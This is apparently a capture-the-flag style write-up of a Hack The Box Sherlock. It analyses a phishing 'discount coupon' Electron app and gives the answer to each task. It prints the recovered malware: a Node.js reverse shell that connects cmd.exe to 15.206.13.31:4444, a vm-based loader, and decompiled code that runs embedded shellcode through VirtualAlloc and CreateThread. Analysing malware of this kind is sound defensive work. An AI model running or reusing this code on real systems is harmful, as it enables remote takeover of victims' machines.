# Opsalwarkameez24-1-super-star

## Description

StoreD Technologies' customer support team operates tirelessly around the clock in 24/7 shifts to meet customer needs. During the Diwali season, employees have been receiving genuine discount coupons as part of the celebrations. However, this also presented an opportunity for a threat actor to distribute fake discount coupons via email to infiltrate the organization's network. One of the employees received a suspicious email, triggering alerts for enumeration activities following a potential compromise. The malicious activity was traced back to an unusual process. The Incident Response Team has extracted the malicious binaries and forwarded them to the reverse engineering team for further analysis. 

**This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. One the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.**

## Files

```bash
â””â”€$ unzip SuperStar.zip
Archive:  SuperStar.zip
  inflating: DANGER.txt
replace SuperStar.zip? [y]es, [n]o, [A]ll, [N]one, [r]ename: r
new name: SuperStarInner.zip
 extracting: SuperStarInner.zip
â””â”€$ ls -lh *.zip
Permissions Size User  Date Modified Name
.rwxrwx---   64M woyag 21 Dec 09:03  ï SuperStar.zip
.rw-rw-r--   64M woyag 30 Oct 14:55  ï SuperStarInner.zip
â””â”€$ unzip -P hacktheblue SuperStarInner.zip
Archive:  SuperStarInner.zip
 extracting: Electron-Coupon.exe
  inflating: opsk1.pcap
â””â”€$ 7z x Electron-Coupon.exe
â””â”€$ cd \$PLUGINSDIR
â””â”€$ 7z x app-64.7z
```

[Reverse Engineering Electron Apps to Discover APIs](https://danaepp.com/reverse-engineering-electron-apps-to-discover-apis)

```
â””â”€$ npm install -g asar
â””â”€$ find . -name *.asar
./resources/app.asar

```
## Tasks

### Task 1. What is the process name of malicious NodeJS application?

We have single exe file inside `$PLUGINS` (unpacked) directory, so this must be the underlying application.
```bash
â””â”€$ find . -name *.exe
./Coupon.exe
```

I think `package.json` `name` also denotes the process name.
```json
{
  "name": "Coupon",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "author": "",
  "license": "ISC",
  "dependencies": {
    "bytenode": "^1.5.6",
    "ffi-napi": "^4.0.3",
    "ref-napi": "^3.0.3"
  },
  "postinstall": "electron-builder install-app-deps"
}
```

::: tip :bulb: Answer
`Coupon.exe`
:::

### Task 2. Which option has the attacker enabled in the script to run the malicious Node.js application?

![Writeup.png](/assets/soc/sherlocks/opsalwarkameez24-1-super-star/Writeup.png)

[BrowserWindow](https://www.electronjs.: org/docs/latest/api/browser-window#window-customization): TheÂ `BrowserWindow`Â class exposes various ways to modify the look and behavior of your app's windows.

[nodeIntegration](https://www.electronjs.org/docs/latest/api/browser-window#class-browserwindow-extends-basewindow): `nodeIntegration`Â boolean (optional) - Whether node integration is enabled. Default isÂ `false`.

::: tip :bulb: Answer
`nodeIntegration`
:::

### Task 3. What protocol and port number is the attacker using to transmit the victim's keystrokes?

![Writeup-1.png](/assets/soc/sherlocks/opsalwarkameez24-1-super-star/Writeup-1.png)

In the `/public` directory there's `keylogger.js` which is using WebSocket for communication on port **44500** on localhost (most probably because it's a sherlock, real malware would have probably had the C2 server IP). 

::: tip :bulb: Answer
`WebSocket, 44500`
:::

### Task 4. What XOR key is the attacker using to decode the encoded shellcode?

`preload.js` has obfuscated code which uses XOR encryption. The XOR key is received by HTTP.

![Writeup-3.png](/assets/soc/sherlocks/opsalwarkameez24-1-super-star/Writeup-3.png)

We also were given wireshark traffic, observing the HTTP only the 9th stream seems to have the XOR key. After this stream websockets communication is starting.

![Writeup-2.png](/assets/soc/sherlocks/opsalwarkameez24-1-super-star/Writeup-2.png)

::: tip :bulb: Answer
`ec1ee034ec1ee034`
:::

### Task 5. What is the IP address, port number and process name encoded in the attacker payload ?

[Recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'Hex','string':'ec1ee034ec1ee034'%7D,'Standard',false)&input=eEhpVldvOXFpVnVDTnNsUDRSVEFGTXcrbGxXZVBvNVJtRDdkRko1N2tVR0ZiSVVjem5DRlFNNDN6RG5tUHNBVXpEN0FGTXg5a0JUUlBwSlJuV3VKUm9rMndsZUVkNHhRczI2U1c0OTdrMGZPTjh3NTVqN0FGTXcrd0JUTWJZZ1UwVDZEUk1KdGtGV2JjTWdXajNPRUdvbG1oUmJBUHJ0cHhTWHRQc3crd0JTYWY1SVVqM0tKVVlKcXdBbk1jSVZEekhDRlFNSk5qMWVIZTVRY3hTWHRQc3crd0JTUGNvbFJnbXJPVjROd2psR1Bhc2dBMkNyVUdNdzgwUUhDTE5BQ3dpL1RHdDh2d2hqTWVKVmFqMnFKVzRJMnlVL2hGTUFVekQ3QUZNdytnMWlGZTQ1QXdtNkpSSWsyazF6Q2JaUlFoWERKRCtFVXdCVE1Qc0FVekQ2VFhNSnRsRkNEYTVRYW5IZVFVY1I5akYySmNKUWQxeFBxRk13K3dCVE1Qc0JIaERDVFFJaDdra2JDYm9sRWlUYURXSVY3amtERkplMCt6RDdBRkpFMzJ6bm1Qc0FVekd5RlFKbHNqaFREZjg4UHpESFBGTHhzaFVLSmNKUkh6R3FJVWN4UWoxQ0pNSXBIekgrUVJJQjNnMVdZZDQ5YXpIaVBSb0UrZzBhTmJZaGRnbm50UHBFM3lCM1g&oeol=CRLF)

![Writeup-4.png](/assets/soc/sherlocks/opsalwarkameez24-1-super-star/Writeup-4.png)

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd.exe", []);
    var client = new net.Socket();
    client.connect(4444, "15.206.13.31", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

::: tip :bulb: Answer
`15.206.13.31, 4444, cmd.exe`
:::

### Task 6. What are the two commands the attacker executed after gaining the reverse shell?

Filter wireshark for only communication from this IP and Port: `(ip.src_host == "15.206.13.31" ) && (tcp.srcport == 4444)`

Follow the stream

![Writeup-5.png](/assets/soc/sherlocks/opsalwarkameez24-1-super-star/Writeup-5.png)

::: tip :bulb: Answer
`whoami, ipconfig`
:::

### Task 7. Which Node.js module and its associated function is the attacker using to execute the shellcode within V8 Virtual Machine contexts?

`preload.js` is running script with following lines
```js
var vm = require("vm");
...
var code = outBuf.toString()
var script = new vm.Script(code);
var context = vm.createContext({ require: require });

script.runInNewContext(context);
```

[Node.js v23.5.0 documentation > VM](https://nodejs.org/api/vm.html) > [script.runInNewContext\(\[contextObject\[, options\]\]\)](https://nodejs.org/api/vm.html#scriptruninnewcontextcontextobject-options)

::: tip :bulb: Answer
`vm, runInNewContext`
:::

### Task 8. Decompile the bytecode file included in the package and identify the Win32 API used to execute the shellcode.

After some research I found [cocos2d-jsc-decompiler](https://github.com/yeyiqun/cocos2d-jsc-decompiler), but the project is too big for such a small application.

[View8](https://github.com/suleram/View8) is another tool, but needs fucking Windows ðŸ’€

[ghidra_nodejs](https://github.com/PositiveTechnologies/ghidra_nodejs) was another alternative, but steps were too complicated so I jumped ship with Windows.

```powershell
PS C:\Users\Kirin\Desktop> git clone https://github.com/suleram/View8.git -q
PS C:\Users\Kirin\Desktop> cd .\View8\
PS C:\Users\Kirin\Desktop\View8> pip install parse
PS C:\Users\Kirin\Desktop\View8> py .\view8.py ..\script.jsc script.txt
Detecting version.
Detected version: 9.4.146.26.
..
FileNotFoundError: The binary 'C:\Users\Kirin\Desktop\View8\Bin\9.4.146.26.exe' does not exist. You can specify a path to a similar disassembler version using the --path (-p) argument.
PS C:\Users\Kirin\Desktop\View8> curl.exe https://github.com/suleram/View8/releases/download/v1.0/9.4.146.24.exe -sLo .\Bin\9.4.146.26.exe
PS C:\Users\Kirin\Desktop\View8> python.exe .\view8.py ..\script.jsc script.txt
Detecting version.
Detected version: 9.4.146.26.
Executing disassembler binary: C:\Users\Kirin\Desktop\View8\Bin\9.4.146.26.exe.
Disassembly completed successfully.
Parsing disassembled file.
Parsing completed successfully.
Decompiling 2 functions.
Exporting to file script.txt.
Done.
PS C:\Users\Kirin\Desktop\View8> cat .\script.txt
function func_unknown()
{
        r0 = func_unknown_000002DB6F81D9D1
        return func_unknown_000002DB6F81D9D1
}
function func_unknown_000002DB6F81D9D1(a0, a1, a2, a3, a4)
{
        r0 = a1("ffi-napi")
        r1 = a1("ref-napi")
        r15 = new [252, 72, 129, 228, 240, 255, 255, 255, 232, 208, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 62, 72, 139, 82, 24, 62, 72, 139, 82, 32, 62, 72, 139, 114, 80, 62, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 62, 72, 139, 82, 32, 62, 139, 66, 60, 72, 1, 208, 62, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 111, 72, 1, 208, 80, 62, 139, 72, 24, 62, 68, 139, 64, 32, 73, 1, 208, 227, 92, 72, 255, 201, 62, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 117, 241, 62, 76, 3, 76, 36, 8, 69, 57, 209, 117, 214, 88, 62, 68, 139, 64, 36, 73, 1, 208, 102, 62, 65, 139, 12, 72, 62, 68, 139, 64, 28, 73, 1, 208, 62, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 62, 72, 139, 18, 233, 73, 255, 255, 255, 93, 62, 72, 141, 141, 32, 1, 0, 0, 65, 186, 76, 119, 38, 7, 255, 213, 73, 199, 193, 0, 0, 0, 0, 62, 72, 141, 149, 14, 1, 0, 0, 62, 76, 141, 133, 25, 1, 0, 0, 72, 49, 201, 65, 186, 69, 131, 86, 7, 255, 213, 72, 49, 201, 65, 186, 240, 181, 162, 86, 255, 213, 67, 79, 85, 80, 79, 78, 49, 51, 51, 55, 0, 80, 65, 87, 78, 69, 68, 0, 117, 115, 101, 114, 51, 50, 46, 100, 108, 108, 0]
        r2 = "Buffer"["from"](r15)
        r6 = r1["refType"](r1["types"]["void"])
        r7 = r1["refType"](r1["types"]["void"])
        r8 = r1["refType"](r1["types"]["uint32"])
        r15 = new {"VirtualAlloc": null, "RtlMoveMemory": null, "CreateThread": null, "WaitForSingleObject": null}
        r17 = new [0, 0]
        r17[0] = r7
        r19 = new [0, 0, 0, 0]
        r19[0] = r7
        r19[1] = r1["types"]["uint64"]
        r19[2] = r1["types"]["uint32"]
        r19[3] = r1["types"]["uint32"]
        r17[1] = r19
        r15["VirtualAlloc"] = r17
        r17 = new [0, 0]
        r17[0] = r1["types"]["void"]
        r19 = new [0, 0, 0]
        r19[0] = r7
        r19[1] = r7
        r19[2] = r1["types"]["uint64"]
        r17[1] = r19
        r15["RtlMoveMemory"] = r17
        r17 = new [0, 0]
        r17[0] = r6
        r19 = new ["pointer", 0, 0, 0, 0, 0]
        r19[1] = r1["types"]["uint64"]
        r19[2] = r7
        r19[3] = r7
        r19[4] = r1["types"]["uint32"]
        r19[5] = r8
        r17[1] = r19
        r15["CreateThread"] = r17
        r17 = new [0, 0]
        r17[0] = r1["types"]["uint32"]
        r19 = new [0, 0]
        r19[0] = r6
        r19[1] = r1["types"]["uint32"]
        r17[1] = r19
        r15["WaitForSingleObject"] = r17
        ACCU = r0["Library"]
        r9 = r0["Library"]("kernel32", r15)
        ACCU = "console"["log"]("shellcode length:", r2["length"])
        r14 = r9
        r10 = r9["VirtualAlloc"](null, r2["length"], 12288, 64)
        ACCU = "console"["log"](r10)
        r14 = r9
        r15 = r10
        r16 = r2
        ACCU = r9["RtlMoveMemory"](r15, r16, r2["length"])
        r15 = r1["refType"](r1["types"]["uint32"])
        r11 = r1["alloc"](r15)
        r14 = r9
        r17 = r10
        r20 = r11
        r12 = r9["CreateThread"](null, 0, r17, null, 0, r20)
        r16 = r11["readUint32LE"]()
        ACCU = "console"["log"]("thread id:", r16)
        ACCU = r9["WaitForSingleObject"](r12, 4294967295.0)
        return undefined
}
```

Main Win32 API calls that are used are following.
```js
        r15 = new {"VirtualAlloc": null, "RtlMoveMemory": null, "CreateThread": null, "WaitForSingleObject": null}
        r15["VirtualAlloc"] = r17
        r15["RtlMoveMemory"] = r17
        r15["CreateThread"] = r17
        r15["WaitForSingleObject"] = r17
        r9 = r0["Library"]("kernel32", r15)
        ACCU = "console"["log"]("shellcode length:", r2["length"])
        r10 = r9["VirtualAlloc"](null, r2["length"], 12288, 64)
        ACCU = "console"["log"](r10)
        ACCU = r9["RtlMoveMemory"](r15, r16, r2["length"])
        r11 = r1["alloc"](r15)
        r12 = r9["CreateThread"](null, 0, r17, null, 0, r20)
        ACCU = "console"["log"]("thread id:", r16)
        ACCU = r9["WaitForSingleObject"](r12, 4294967295.0)
```

[CreateThread function (processthreadsapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread): Creates a thread to execute within the virtual address space of the calling process.

::: tip :bulb: Answer
`CreateThread`
:::

### Task 9. Submit the fake discount coupon that the attacker intended to present to the victim.

[Recipe](https://gchq.github.io/CyberChef/#recipe=From_Decimal\('Space',false\)Strings\('Single%20byte',4,'Alphanumeric%20%2B%20punctuation%20\(A\)',false,false,false\)&input=MjUyLCA3MiwgMTI5LCAyMjgsIDI0MCwgMjU1LCAyNTUsIDI1NSwgMjMyLCAyMDgsIDAsIDAsIDAsIDY1LCA4MSwgNjUsIDgwLCA4MiwgODEsIDg2LCA3MiwgNDksIDIxMCwgMTAxLCA3MiwgMTM5LCA4MiwgOTYsIDYyLCA3MiwgMTM5LCA4MiwgMjQsIDYyLCA3MiwgMTM5LCA4MiwgMzIsIDYyLCA3MiwgMTM5LCAxMTQsIDgwLCA2MiwgNzIsIDE1LCAxODMsIDc0LCA3NCwgNzcsIDQ5LCAyMDEsIDcyLCA0OSwgMTkyLCAxNzIsIDYwLCA5NywgMTI0LCAyLCA0NCwgMzIsIDY1LCAxOTMsIDIwMSwgMTMsIDY1LCAxLCAxOTMsIDIyNiwgMjM3LCA4MiwgNjUsIDgxLCA2MiwgNzIsIDEzOSwgODIsIDMyLCA2MiwgMTM5LCA2NiwgNjAsIDcyLCAxLCAyMDgsIDYyLCAxMzksIDEyOCwgMTM2LCAwLCAwLCAwLCA3MiwgMTMzLCAxOTIsIDExNiwgMTExLCA3MiwgMSwgMjA4LCA4MCwgNjIsIDEzOSwgNzIsIDI0LCA2MiwgNjgsIDEzOSwgNjQsIDMyLCA3MywgMSwgMjA4LCAyMjcsIDkyLCA3MiwgMjU1LCAyMDEsIDYyLCA2NSwgMTM5LCA1MiwgMTM2LCA3MiwgMSwgMjE0LCA3NywgNDksIDIwMSwgNzIsIDQ5LCAxOTIsIDE3MiwgNjUsIDE5MywgMjAxLCAxMywgNjUsIDEsIDE5MywgNTYsIDIyNCwgMTE3LCAyNDEsIDYyLCA3NiwgMywgNzYsIDM2LCA4LCA2OSwgNTcsIDIwOSwgMTE3LCAyMTQsIDg4LCA2MiwgNjgsIDEzOSwgNjQsIDM2LCA3MywgMSwgMjA4LCAxMDIsIDYyLCA2NSwgMTM5LCAxMiwgNzIsIDYyLCA2OCwgMTM5LCA2NCwgMjgsIDczLCAxLCAyMDgsIDYyLCA2NSwgMTM5LCA0LCAxMzYsIDcyLCAxLCAyMDgsIDY1LCA4OCwgNjUsIDg4LCA5NCwgODksIDkwLCA2NSwgODgsIDY1LCA4OSwgNjUsIDkwLCA3MiwgMTMxLCAyMzYsIDMyLCA2NSwgODIsIDI1NSwgMjI0LCA4OCwgNjUsIDg5LCA5MCwgNjIsIDcyLCAxMzksIDE4LCAyMzMsIDczLCAyNTUsIDI1NSwgMjU1LCA5MywgNjIsIDcyLCAxNDEsIDE0MSwgMzIsIDEsIDAsIDAsIDY1LCAxODYsIDc2LCAxMTksIDM4LCA3LCAyNTUsIDIxMywgNzMsIDE5OSwgMTkzLCAwLCAwLCAwLCAwLCA2MiwgNzIsIDE0MSwgMTQ5LCAxNCwgMSwgMCwgMCwgNjIsIDc2LCAxNDEsIDEzMywgMjUsIDEsIDAsIDAsIDcyLCA0OSwgMjAxLCA2NSwgMTg2LCA2OSwgMTMxLCA4NiwgNywgMjU1LCAyMTMsIDcyLCA0OSwgMjAxLCA2NSwgMTg2LCAyNDAsIDE4MSwgMTYyLCA4NiwgMjU1LCAyMTMsIDY3LCA3OSwgODUsIDgwLCA3OSwgNzgsIDQ5LCA1MSwgNTEsIDU1LCAwLCA4MCwgNjUsIDg3LCA3OCwgNjksIDY4LCAwLCAxMTcsIDExNSwgMTAxLCAxMTQsIDUxLCA1MCwgNDYsIDEwMCwgMTA4LCAxMDgsIDA)

![Writeup-6.png](/assets/soc/sherlocks/opsalwarkameez24-1-super-star/Writeup-6.png)

::: tip :bulb: Answer
`COUPON1337`
:::